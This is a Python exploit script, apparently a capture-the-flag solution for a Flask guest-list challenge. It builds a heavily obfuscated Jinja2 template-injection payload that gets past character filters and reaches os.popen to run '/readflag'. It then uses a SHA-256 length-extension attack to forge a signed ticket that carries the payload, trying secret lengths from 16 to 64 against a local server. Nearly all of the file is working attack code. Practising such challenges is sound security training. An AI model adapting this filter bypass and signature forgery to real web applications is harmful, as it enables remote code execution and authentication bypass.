import requests
from bs4 import BeautifulSoup
import urllib.parse
import HashTools # pip install length-extension-tool


def encode_number(num: int) -> str:
    assert num >= 0
    encoded = []
    for _ in range(num):
        encoded.append("({}|int)")
    return "(("+"~".join(encoded) + ")|string|length" + ")"

def encode_str_index(target, index: int) -> str:
    return f"({target}|string|batch({encode_number(index)})|list|first|last)"

g_str = "<flask.g of 'guest_list'>"
mapped_str = "<generator object sync_do_map at "
str_doc_str = """str(object='') -> str
str(bytes_or_buffer[, encoding[, errors]]) -> str

Create a new string object from the given object. If encoding or
errors is specified, then the object must expose a data buffer
that will be decoded using the given encoding and error handler.
Otherwise, returns the result of object.__str__() (if defined)
or repr(object).
encoding defaults to sys.getdefaultencoding().
errors defaults to 'strict'."""

def build_translation_table(sources):
    translation = {}
    for prefix, source in sources:
        unique_chars = set(source)
        for char in unique_chars:
            if char not in translation:
                # Find the first occurrence of the character
                idx = source.index(char)
                if idx != -1:
                    translation[char] = encode_str_index(prefix, idx+1)

    # delete () from translation
    if "(" in translation:
        del translation["("]
    if ")" in translation:
        del translation[")"]

    return translation

def join_and_translate(string,translations):
    return "("+ "~".join(string).translate(str.maketrans(translations)) + ")"

sources = [
    ("g", g_str),
    ("({}|map|string)", mapped_str),
]

TRANSLATIONS = build_translation_table(sources)

_doc_ = join_and_translate("__doc__",TRANSLATIONS)

ATTR_STRING = join_and_translate("attribute",TRANSLATIONS)

def get_attr(target, attribute):
    global ATTR_STRING
    return "(({(TARGET):{}})|list|map(**{(ATTR_STR):(ATTRIBUTE)})|list|first)".replace("TARGET", target).replace("ATTR_STR", ATTR_STRING).replace("ATTRIBUTE", attribute)

def get_attr2(target, attribute):
    global ATTR_STRING
    return "(({(TARGET):{}})|list|map(**{(ATTR_STR):(ATTRIBUTE)})|list)".replace("TARGET", target).replace("ATTR_STR", ATTR_STRING).replace("ATTRIBUTE", attribute)


str_doc = get_attr("g|string", _doc_)


sources.append((str_doc, str_doc_str))

# should be enough for all lowercase letters aside from q
TRANSLATIONS = build_translation_table(sources)

importer = get_attr("g", join_and_translate("__iter__.__builtins__.__import__",TRANSLATIONS))
_chr = get_attr("g", join_and_translate("__iter__.__builtins__.chr",TRANSLATIONS))
_slash = f"({_chr}({encode_number(ord('/'))}))"
cmd = "(" + _slash + "~" + join_and_translate("readflag",TRANSLATIONS) + ")"
os_str = join_and_translate("os",TRANSLATIONS)
os_module = f"({importer}({os_str}))"
popen = get_attr(os_module, join_and_translate("popen",TRANSLATIONS))

rce = f"(({popen})({cmd}))"

read = get_attr(rce, join_and_translate("read",TRANSLATIONS))

final_ssti = "{{"+f"({read}())"+"}}"

BASE_URL = "http://localhost:5000"

def parse_guest_list(url):
    r = requests.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    rows = soup.find_all('tr')[1:]  # Skip the header row
    guest_data = []
    for row in rows:
        tds = row.find_all('td')
        if len(tds) == 3:
            guest_data.append((tds[0].text, tds[1].text))
    return guest_data

# just use the first guest

guest_data = parse_guest_list(BASE_URL)
name = guest_data[0][0].strip()
ticket = guest_data[0][1].strip()

appended_data = final_ssti.encode()
for secret_length in range(16, 65):
    h = HashTools.new('sha256')
    new_name, new_ticket = h.extension(secret_length=secret_length, original_data=name.encode(), append_data=appended_data, signature=ticket)

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=ISO-8859-1'
    }

    data = {
        'name': new_name.decode('latin-1'),
        'ticket': new_ticket
    }

    response = requests.post(BASE_URL + "/signin", headers=headers, data=data)

    if "uoftctf" in response.text:
        import re
        flag = re.search(r"uoftctf{.*}", response.text).group()
        print(flag)
        break